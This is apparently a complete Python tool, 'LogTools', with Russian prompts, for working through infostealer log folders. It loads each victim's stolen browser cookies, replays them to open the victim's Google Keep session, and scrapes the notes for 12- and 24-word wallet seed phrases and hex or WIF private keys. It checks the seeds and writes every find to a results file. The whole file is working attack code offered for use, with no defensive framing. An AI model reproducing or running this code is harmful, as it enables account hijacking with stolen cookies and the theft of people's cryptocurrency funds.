from http import cookiejar
import glob, requests, re
from mnemonic import Mnemonic
import os, pyfiglet
banner = pyfiglet.figlet_format("LogTools")
print(banner)
folder = input("[SYSTEM] Введите путь к папке с логами > ")

cookies = glob.glob(f"{folder}/*/Cookies/*.txt")
for file in cookies:
    try:
        f = open(file, "r+")
        cookie = f.read()
        open("checking.txt", "w").write(f"# Netscape HTTP Cookie File\n{cookie}")
        cj = cookiejar.MozillaCookieJar("checking.txt")
        cj.load()
        r = requests.get("https://keep.google.com/u/0/", cookies=cj)
        data = r.text
        seeds12 = re.findall(r"[Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15}", data)
        seeds24 = re.findall(r"[Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15} [Aa-zZ]{3,15}", data)
        pkey_hex = re.findall(r"[a-f0-9]{64}", data)
        pkey_wif = re.findall(r"5[HJK][1-9A-Za-z]{48,52}", data)
        for seed12 in seeds12:
            mnemo = Mnemonic("english")
            isValid = mnemo.check(seed12)
            if isValid == True:
                print(f"[LOG] Новый сид - {seed12}")
            open("results.txt", "a").write(f"{seed12}\n")
        for seed24 in seeds24:
            mnemo = Mnemonic("english")
            isValid = mnemo.check(seed24)
            if isValid == True:
                print(f"[LOG] Новый сид - {seed24}")
            open("results.txt", "a").write(f"{seed24}\n")
        for key_hex in pkey_hex:
            print(f"[LOG] Новый ключ - {key_hex}")
            open("results.txt", "a").write(f"{key_hex}\n")
        for key_wif in pkey_wif:
            print(f"[LOG] Новый ключ - {key_wif}")
            open("results.txt", "a").write(f"{key_wif}\n")
    except Exception:
        pass

input("[SYSTEM] Нажмите ENTER для выхода в меню")
os.system("clear")
os.system("python main.py")
